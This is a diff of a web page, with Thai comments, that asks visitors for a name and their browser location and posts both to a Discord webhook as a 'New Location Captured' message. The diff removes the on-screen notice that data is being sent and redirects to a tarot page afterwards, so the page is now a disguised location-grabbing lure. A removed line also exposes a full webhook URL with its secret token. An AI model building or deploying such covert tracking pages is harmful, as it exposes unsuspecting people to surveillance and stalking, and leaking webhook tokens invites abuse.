@@ -57,14 +57,6 @@
       color: #000;
       box-shadow: 0 0 16px #00ff00, inset 0 0 12px #00ff00;
     }
-    #output {
-      margin-top: 2rem;
-      font-size: 1.4rem;
-      text-shadow: 0 0 4px #00ff00;
-      min-height: 80px;
-      white-space: pre-wrap;
-      user-select: text;
-    }
     @keyframes flicker {
       0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
       20%, 22%, 24%, 55% { opacity: 0.5; }
@@ -79,12 +71,9 @@
   <br>
   <button id="locateBtn" disabled>Get my loca</button>
 
-  <p id="output" aria-live="polite"></p>
-
   <script>
     const nameInput = document.getElementById('nameInput');
     const locateBtn = document.getElementById('locateBtn');
-    const output = document.getElementById('output');
 
     nameInput.addEventListener('input', () => {
       const name = nameInput.value.trim();
@@ -101,39 +90,26 @@
       const name = nameInput.value.trim();
 
       if (!navigator.geolocation) {
-        output.textContent = '❌ Your browser does not support Geolocation.';
+        alert('❌ Your browser does not support Geolocation.');
         return;
       }
 
       locateBtn.disabled = true;
       locateBtn.textContent = 'LOCATING...';
-      output.textContent = '⏳ Getting location...';
 
       navigator.geolocation.getCurrentPosition(
         pos => {
           const { latitude, longitude } = pos.coords;
-
-          output.innerHTML =
-            `✅ Name: ${name}\n` +
-            `🌐 Lat: ${latitude.toFixed(6)}\n` +
-            `🌐 Lng: ${longitude.toFixed(6)}\n` +
-            `📍 Map: https://maps.google.com/?q=${latitude},${longitude}\n\n` +
-            `📤 Sending to Discord...`;
-
           sendToDiscord(name, latitude, longitude).then(() => {
-            output.innerHTML += `\n✅ Sent location to champ complete!`;
-            locateBtn.textContent = 'Get my loca';
+            window.location.href = "tarot.html"; // ✅ เปลี่ยนไปหน้าไพ่ทาโรต์
           }).catch(() => {
-            output.innerHTML += `\n❌ Failed to send.`;
+            alert('❌ Failed to send data.');
+            locateBtn.disabled = false;
             locateBtn.textContent = 'Get my loca';
           });
         },
         err => {
-          let msg = '❌ Location error.';
-          if (err.code === err.PERMISSION_DENIED) msg = '⚠️ Permission denied.';
-          else if (err.code === err.POSITION_UNAVAILABLE) msg = '⚠️ Location unavailable.';
-          else if (err.code === err.TIMEOUT) msg = '⚠️ Timeout.';
-          output.textContent = msg;
+          alert('⚠️ Failed to access location.');
           locateBtn.disabled = false;
           locateBtn.textContent = 'Get my loca';
         },
@@ -142,7 +118,7 @@
     });
 
     async function sendToDiscord(name, lat, lng) {
-      const webhook = "https://discordapp.com/api/webhooks/1391646097528717322/D3VW1hQsPPUiEFE9lTwhjfXaDyf2qLHaf9rWGPOSTcCEzaY1OuNNGdUyirbpimBPOlzI"; // 🔁 ใส่ของวิน
+      const webhook = "https://discord.com/api/webhooks/วินใส่ลิ้งตรงนี้นะจ๊ะ";
       const safeName = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
       const msg = {
         content: `📥 **New Location Captured**\n👤 Name: ${safeName}\n📍 https://maps.google.com/?q=${lat},${lng}`
